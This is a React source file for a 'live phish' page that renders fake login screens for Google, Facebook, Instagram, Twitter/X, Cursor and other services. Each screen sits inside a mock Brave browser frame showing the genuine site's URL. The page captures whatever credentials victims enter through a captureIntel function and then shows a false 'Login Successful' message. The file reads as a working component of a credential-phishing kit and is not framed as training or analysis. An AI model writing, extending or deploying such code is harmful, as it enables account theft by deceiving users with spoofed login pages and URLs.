import React from 'react';
import { useParams } from 'react-router-dom';
import BraveBrowserWrapper from '../components/phishing/BraveBrowserWrapper';
import { usePhishing } from '../components/PhishingContext';
import { Globe } from 'lucide-react';
import {
  GoogleLogin,
  FacebookLogin,
  InstagramLogin,
  ZaiTemplate,
  PhilosophyTemplate,
  StartpageTemplate,
  SecurityTemplate,
  TwitterTemplate,
  CursorTemplate
} from '../components/phishing/templates';

const LivePhishPage: React.FC = () => {
  const { templateId } = useParams<{ templateId: string }>();
  const { captureIntel } = usePhishing();

  const handleSuccess = (data: any) => {
    captureIntel(templateId || 'unknown', data);
    // After "login", show a success message or redirect
    alert("Login Successful! Your session is being initialized.");
  };

  const templates: Record<string, { name: string, url: string, component: React.ReactNode }> = {
    google: { name: 'Google Login', url: 'https://accounts.google.com', component: <GoogleLogin onSuccess={handleSuccess} /> },
    facebook: { name: 'Facebook Connect', url: 'https://facebook.com', component: <FacebookLogin onSuccess={handleSuccess} /> },
    instagram: { name: 'Instagram', url: 'https://instagram.com', component: <InstagramLogin onSuccess={handleSuccess} /> },
    twitter: { name: 'Twitter / X', url: 'https://twitter.com', component: <TwitterTemplate onSuccess={handleSuccess} /> },
    zai: { name: 'Z.ai Platform', url: 'https://z.ai', component: <ZaiTemplate onSuccess={handleSuccess} /> },
    cursor: { name: 'Cursor Editor', url: 'https://cursor.com', component: <CursorTemplate onSuccess={handleSuccess} /> },
    security: { name: 'Google Security', url: 'https://myaccount.google.com/security', component: <SecurityTemplate onSuccess={handleSuccess} /> },
    startpage: { name: 'Startpage Search', url: 'https://startpage.com', component: <StartpageTemplate onSuccess={handleSuccess} /> },
    philosophy: { name: 'Design Philosophy', url: 'https://designphilosophy.io', component: <PhilosophyTemplate onSuccess={handleSuccess} /> },
  };

  const template = templateId ? templates[templateId] : null;

  if (!template) {
    return <div style={{ background: '#000', color: '#f55', height: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'monospace' }}>404_TEMPLATE_NOT_FOUND</div>;
  }

  return (
    <div style={{ height: '100vh', width: '100vw', background: '#000' }}>
      <BraveBrowserWrapper 
        activeTabUrl={template.url}
        tabs={[
          { id: templateId!, title: template.name, url: template.url, icon: <Globe size={12} />, active: true }
        ]}
      >
        {template.component}
      </BraveBrowserWrapper>
    </div>
  );
};

export default LivePhishPage;
